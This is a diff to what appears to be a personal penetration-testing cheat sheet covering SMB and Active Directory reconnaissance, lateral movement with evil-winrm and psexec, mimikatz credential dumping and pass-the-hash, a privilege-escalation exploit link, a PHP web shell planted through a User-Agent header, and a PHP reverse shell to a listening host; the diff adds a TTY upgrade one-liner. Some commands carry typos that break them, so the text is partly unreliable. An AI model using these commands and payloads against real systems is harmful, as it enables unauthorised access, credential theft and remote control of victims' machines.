@@ -5,47 +5,47 @@ nmap -sS -n -p 445 --script smb-protocls 192.168.1.1
 
 ## AD Reacon ##  
 
-# Windows  
+# Windows #  
 nbtstat -A (IP)  
 adreacon  
-# Linux  
+# Linux #  
 enum4linux-ng -A  
 
-## Reacon SMB  
+## Reacon SMB ##  
 net view \\192.168.1.1  
 dir \\192.168.1.1  
 smbclient -L //IP -U DC_name\\acount  
 nmap -n -sS -p137,138,139,448 --script smb-os-discovery 192.168.1.1  
 nmap -sS -n -p 445 --script smb-protocls 192.168.1.1  
 
-## Use SMB 
+## Use SMB ##  
 smbclient -L //IP -U DC_name\\acount  
 smbclient //IP/<Folder> -U DC_name\\account  
 smbclient //192.168.1.1/C$ -U DC_name\\account  
 
-## Download File 
+## Download File ##  
 certutil -urlcache -split -f <URL> <輸出檔名>  
 
-## Windows Remote  
-# WinRM  
+## Windows Remote #  
+# WinRM #  
 evil-winrm  
-# RDP  
+# RDP #  
 xfreerdp3 
-# psexec  
+# psexec #  
 impacket-psexec  
 psexec \\192.168.1.1: cmd.exe  
-# smbexec  
+# smbexec #  
 impacket-smbexec  
 
-# mimikatz  
+# mimikatz #  
 privilege::debug  
 tocke::elevate  
 lsadump::sam  
 sekurlsa::pth /user:administrator /domain:. /ntlm:<ntlm hash>  
 
-## GDB 
-# Install Plgu-in  
-# Commands  
+## GDB #  
+# Install PEDA Plgu-in ##  
+# Commands #  
 gdb XXXX(binary name)  
 b main  
 run  
@@ -54,8 +54,8 @@ disassemble main
 p system
 search /bin/sh  
 
-## Privilege Escalation  
-# Overlay  
+## Privilege Escalation #  
+# Overlay #  
 https://github.com/briskets/CVE-2021-3493  
 
 
@@ -87,3 +87,6 @@ User-Agent: <?php system($_GET['cmd']); ?>
 ## Reverse Shell
 # php
 ``` php -r '$sock=fsockopen("192.168.1.1",4444);$proc=proc_open("/bin/sh -i", array(0>=$sock, 1=>$sock, 2=>sock),$pipes);' ```
+
+## TTY ##  
+``` python3 -c 'import pty; pty.spawn("/bin/sh")' ```  
